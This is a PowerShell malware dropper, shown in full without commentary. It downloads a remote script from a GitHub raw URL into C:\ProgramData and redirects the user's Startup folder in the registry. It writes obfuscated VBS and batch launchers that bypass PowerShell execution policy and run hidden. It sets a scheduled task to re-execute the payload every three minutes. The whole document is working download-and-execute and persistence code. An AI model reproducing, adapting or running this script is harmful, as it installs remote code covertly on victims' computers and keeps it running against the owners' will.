

$xs1a = "C:\ProgramData\Desk\Microsoft"
New-Item $xs1a -ItemType Directory -Force

$xs1a = "C:\ProgramData\StartUp"
New-Item $xs1a -ItemType Directory -Force
start-sleep 2

$download_url = "https://raw.githubusercontent.com/adham5055/adham5055/main/loxa.js"
$local_path = "C:\ProgramData\Desk\Microsoft\Cotrl.ps1"
$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile($download_url, $local_path)


$s1 = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders"
$m1 = "Startup"
$ocb = "C:\ProgramData\StartUp\"
Set-ItemProperty -Path $s1 -Name $m1 -Value $ocb;
$v1 = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders"
$k1 = "Startup"
$str = "C:\ProgramData\StartUp\"
Set-ItemProperty -Path $v1 -Name $k1 -Value $str;


$Content = @'

taskkill /F /IM powershell.exe /T

PowerShell -NoProfile -ExecutionPolicy Bypass -Command C:\ProgramData\Desk\Microsoft\Cotrl.ps1


'@
Set-Content -Path C:\ProgramData\Desk\Microsoft\Cotrl.bat -Value $Content



$Content = @'



on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
GJCF = ("t.S")
ANMC = ("p"+GJCF+"h")
PCLC = ("ri"+ANMC+"el")
UGOS = ("Sc")
Set OBJ1 = CreateObject("W"+UGOS+PCLC+"l")
NewPath = Replace("P@o@we@r@s@h@e@l@l@","@","")
BM = NewPath + " C:\ProgramData\Desk"
BM1 = "\Microsoft\xx.bat"
WScript.Sleep(2000)
OBJ1.Run BM+BM1,ChrW("4"+"8")


'@
Set-Content -Path C:\ProgramData\Desk\Microsoft\xx.vbs -Value $Content
$Content = @'

on error resume next

Set shell = CreateObject("WScript.Shell")
shell.CurrentDirectory = "C:\ProgramData\Desk\Microsoft\"
shell.Run "Cotrl.bat" ,0
'@
Set-Content -Path C:\ProgramData\StartUp\Cotrl.vbs -Value $Content

$Content = @'


schtasks.exe /create /tn x64 /sc minute  /mo 3 /tr "C:\ProgramData\StartUp\Cotrl.vbs"
'@
Set-Content -Path C:\ProgramData\Desk\Microsoft\xx.bat -Value $Content

start-sleep 7
$Q = "C:\ProgramData\Desk\Microsoft\xx.vbs"
start $Q


